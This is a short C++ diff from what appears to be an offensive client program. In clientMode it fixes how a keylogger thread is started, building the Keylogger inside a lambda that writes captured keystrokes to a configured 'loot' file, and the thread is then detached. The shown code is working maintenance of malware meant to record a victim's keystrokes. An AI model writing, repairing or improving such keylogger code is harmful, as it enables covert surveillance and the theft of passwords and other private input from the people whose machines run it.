@@ -172,10 +172,11 @@ int clientMode(const Properties &p) {
     }
     */
     // Start the keylogger in another thread and detach
-    Keylogger* kl = new Keylogger(p.at("keylogLootFile"));
-    std::thread kl_thread(&Keylogger::start_logging, &kl);
+    std::thread kl_thread([p] {
+        Keylogger kl(p.at("keylogLootFile"));
+        kl.start_logging();
+    });
     kl_thread.detach();
-
 
     const std::string &interface = p.at("interface");
     const std::string &key = p.at("key");
